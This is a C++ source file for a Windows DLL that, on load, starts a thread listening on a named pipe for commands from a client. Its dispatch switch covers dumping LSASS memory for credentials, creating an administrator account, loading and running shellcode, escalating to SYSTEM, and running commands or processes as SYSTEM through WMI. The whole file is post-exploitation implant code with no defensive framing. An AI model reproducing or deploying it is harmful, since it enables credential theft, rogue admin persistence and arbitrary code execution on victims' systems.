// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "service2system.h"
#include "utils.h"
#include "global.h"
#include "wmi.h"
#include "minidump.h"
#include "adduser.h"
#include "shellcode.h"
#include <corecrt_wstdio.h>

DWORD dwThreadId = 0;
LPWSTR g_pwszCommandLine = NULL;
HANDLE hSystemToken = INVALID_HANDLE_VALUE;
PCHAR g_ShellcodeBuffer = NULL;
DWORD g_dwShellcodeSize = 0;

void* __RPC_USER midl_user_allocate(size_t size)
{
    return malloc(size);
}

// Memory deallocation function for RPC.
void __RPC_USER midl_user_free(void* p)
{
    free(p);
}

DWORD HandleCode(VOID) {
    HANDLE hPipe;
    DWORD dwError;
    DWORD dwLen;
    
    hPipe = CreateNamedPipe(
        PIPE_NAME,
        PIPE_ACCESS_DUPLEX,
        PIPE_WAIT | PIPE_TYPE_MESSAGE | PIPE_TYPE_BYTE | PIPE_READMODE_MESSAGE,
        PIPE_UNLIMITED_INSTANCES,
        BUFF_SIZE+1,
        BUFF_SIZE+1,
        0,
        NULL);
    if (hPipe == INVALID_HANDLE_VALUE) {
        dwError = GetLastError();
        wprintf(L"[-] Create Pipe Error : %d \n", dwError);
        return dwError;
    }
    wprintf(L"[+] Create Pipe Success : %s \n", PIPE_NAME);
    for (;;) {
        if (ConnectNamedPipe(hPipe, NULL) > 0) {
            CHAR szBuffer[BUFF_SIZE];
            BYTE  bMethod; // 操作方法
            ZeroMemory(szBuffer, BUFF_SIZE);
            wprintf(L"[+] Client Connected...\n");
            // 读取操作方法
            ReadFile(hPipe, &bMethod, 1, &dwLen, NULL);
            switch (bMethod)
            {
            case METHOD_WMI_CREATE_PROCESS:
                ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
                WMICCreateProcess(char2wchar(szBuffer));
                break;
            case METHOD_MINIDUMP_LSASS:
                MiniDumpLsass();
                break;
            case METHOD_ADD_USER:
                CreateAdminUserInternal();
                break;
            case METHOD_SHELL_CODE_LOADE:
                ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
                ExecuteShellCode(szBuffer, dwLen);
                break;
            case METHOD_GETSYSTEM:
                ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
                Service2System();
                break;
            case METHOD_SYSTEM_EXECUTE:
                ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
                ExecuteCommand(char2wchar(szBuffer));
                break;
            case METHOD_OPEN_SYSTEM_DOOR:
                ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
                SystemCreateProcess(char2wchar(szBuffer));
                break;
            case METHOD_SET_SYSTEM_SHELLCODE:
                ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
                g_dwShellcodeSize = dwLen;
                g_ShellcodeBuffer = szBuffer;
                break;
            case METHOD_UNSET_SYSTEM_SHELLCODE:
                g_dwShellcodeSize = 0;
                g_ShellcodeBuffer = NULL;
                break;
                
            default:

                break;
            }
            // 关闭连接
            DisconnectNamedPipe(hPipe);
        }
    }

}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)HandleCode, NULL, NULL, &dwThreadId);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

